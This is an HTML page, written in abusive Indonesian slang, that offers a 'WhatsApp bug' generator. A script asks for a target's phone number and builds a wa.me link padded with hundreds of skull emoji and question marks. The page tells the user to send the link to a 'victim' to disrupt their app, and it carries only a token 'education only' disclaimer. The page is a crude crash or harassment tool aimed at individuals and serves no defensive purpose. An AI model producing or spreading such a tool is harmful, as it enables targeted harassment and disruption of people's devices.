<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Bug Tool</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #075E54; 
            font-family: monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #128C7E;
            border-radius: 15px;
            padding: 30px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        h1 { color: white; text-align: center; margin-bottom: 20px; }
        textarea {
            width: 100%;
            height: 150px;
            padding: 10px;
            border-radius: 10px;
            border: none;
            margin-bottom: 15px;
            font-family: monospace;
            background: #1a1a1a;
            color: #0f0;
            font-size: 12px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: black;
            color: #0f0;
            border: 2px solid #0f0;
            border-radius: 10px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 15px;
            font-size: 16px;
        }
        button:hover { background: #0f0; color: black; }
        .alert { 
            background: #ff0000; 
            color: white; 
            padding: 10px; 
            border-radius: 8px; 
            text-align: center;
            font-size: 12px;
        }
        .info { background: #333; color: white; padding: 10px; border-radius: 8px; font-size: 12px; margin-top: 15px; }
    </style>
</head>
<body>
<div class="container">
    <h1>🔥 WHATSAPP BUG TOOL 🔥</h1>
    <textarea id="bugText" readonly>http://wa.me/6281234567890?text=%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%F0%9F%92%80%0A%0A%0A%0A%0A%0A%0A%0A%0A</textarea>
    <button onclick="copyText()">📋 COPY BUG LINK</button>
    <button onclick="generateBug()">⚡ GENERATE NEW BUG</button>
    <div class="alert">⚠️ INI CUMA BUAT EDUKASI TAI! JANGAN SALAHIN GUE KALO KENA MASALAH ⚠️</div>
    <div class="info">
        💀 CARA PAKAI:<br>
        1. COPY LINK DI ATAS<br>
        2. KIRIM KE TARGET LEWAT WA<br>
        3. JANGAN NANGIS KALO GAK WORK KAKEK GW 😡
    </div>
</div>
<script>
    function copyText() {
        let text = document.getElementById('bugText');
        text.select();
        document.execCommand('copy');
        alert('LINK BUG DI COPY GOBLOK! SEKARANG KIRIM KE MANGSA LO');
    }
    function generateBug() {
        let nomor = prompt('MASUKIN NOMOR TARGET (62xxx) JING:');
        if(!nomor) return;
        let bugChar = '%F0%9F%92%80'.repeat(999) + '?'.repeat(999);
        let link = `http://wa.me/${nomor}?text=${bugChar}`;
        document.getElementById('bugText').value = link;
        alert('LINK BUG BARU UDAH JADI TAI! KIRIMIN TUH KE TARGET LO 👿');
    }
</script>
</body>
</html>
